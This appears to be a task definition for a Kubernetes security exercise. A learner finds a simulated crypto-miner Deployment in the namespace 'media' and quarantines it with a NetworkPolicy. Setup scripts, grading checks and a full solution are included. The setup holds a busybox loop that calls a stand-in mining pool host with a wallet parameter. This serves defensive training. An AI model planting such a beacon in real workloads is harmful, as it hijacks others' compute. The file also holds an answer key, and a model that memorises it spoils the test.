id: cks-runtime-005
title: Contain a crypto-miner workload
domain: runtime
difficulty: 3
minutes: 12
environment: secure-node
setup: |
  kubectl create namespace media
  kubectl -n media create deployment thumbnailer --image=nginx:1.27-alpine
  kubectl -n media create deployment uploader --image=nginx:1.27-alpine
  kubectl -n media expose deployment thumbnailer --port=80
  kubectl -n media expose deployment uploader --port=80
  cat <<'YAML' | kubectl apply -f -
  apiVersion: apps/v1
  kind: Deployment
  metadata: { name: transcoder, namespace: media }
  spec:
    selector:
      matchLabels: { app: transcoder }
    template:
      metadata:
        labels: { app: transcoder }
      spec:
        containers:
        - name: worker
          image: busybox:1.36
          command:
          - sh
          - -c
          - |
            while true; do
              echo "job: converting video batch"
              wget -q -T 2 -O /dev/null http://stratum.xmr-pool.example:3333/submit?wallet=4A9xQ || true
              sleep 15
            done
  YAML
  kubectl -n media rollout status deployment thumbnailer --timeout=180s
  kubectl -n media rollout status deployment uploader --timeout=180s
  kubectl -n media rollout status deployment transcoder --timeout=180s
  mkdir -p /root/incident
task: |
  Monitoring shows traffic from the namespace `media` to a **cryptocurrency mining pool**.
  There are three Deployments: `thumbnailer`, `uploader` and `transcoder`.

  1. Find the Deployment whose Pods contact the mining pool (look at the Pod specs and logs).
     Write its name into `/root/incident/miner.txt`.
  2. **Contain** it, but keep the Pod running for forensics: create a NetworkPolicy called
     `quarantine` in `media` that selects **only** the Pods of that Deployment and blocks **all**
     their incoming and outgoing traffic.

  The other two Deployments must keep working and talking to each other.
checks:
  - name: miner.txt names the right Deployment
    run: '[ "$(tr -d "[:space:]" < /root/incident/miner.txt)" = transcoder ]'
  - name: NetworkPolicy quarantine selects app=transcoder and blocks Ingress and Egress
    run: |
      kubectl -n media get netpol quarantine -o json | jq -e '
        .spec.podSelector.matchLabels.app == "transcoder"
        and (.spec.policyTypes | index("Ingress")) and (.spec.policyTypes | index("Egress"))
        and ((.spec.ingress // []) | length == 0) and ((.spec.egress // []) | length == 0)'
  - name: The transcoder Pod still runs but cannot reach other Services
    run: |
      [ "$(kubectl -n media get deploy transcoder -o jsonpath='{.status.readyReplicas}')" = 1 ] &&
      kubectl -n media exec deploy/transcoder -- true &&
      ! kubectl -n media exec deploy/transcoder -- wget -qO- -T 3 http://$(kubectl -n media get svc thumbnailer -o jsonpath='{.spec.clusterIP}') &&
      ! kubectl -n media exec deploy/transcoder -- wget -qO- -T 3 http://$(kubectl -n media get svc uploader -o jsonpath='{.spec.clusterIP}')
  - name: thumbnailer can still reach uploader
    run: kubectl -n media exec deploy/thumbnailer -- wget -qO- -T 4 http://uploader | grep -qi nginx
    guard: true
solution: |
  kubectl -n media get deploy -o wide
  kubectl -n media logs deploy/transcoder
  kubectl -n media get deploy transcoder -o yaml | grep -A6 command   # stratum.xmr-pool... :3333
  echo transcoder > /root/incident/miner.txt
  cat <<'YAML' | kubectl apply -f -
  apiVersion: networking.k8s.io/v1
  kind: NetworkPolicy
  metadata:
    name: quarantine
    namespace: media
  spec:
    podSelector:
      matchLabels:
        app: transcoder
    policyTypes: [Ingress, Egress]
  YAML
docs:
  - https://kubernetes.io/docs/concepts/services-networking/network-policies/
  - https://kubernetes.io/docs/concepts/security/security-checklist/
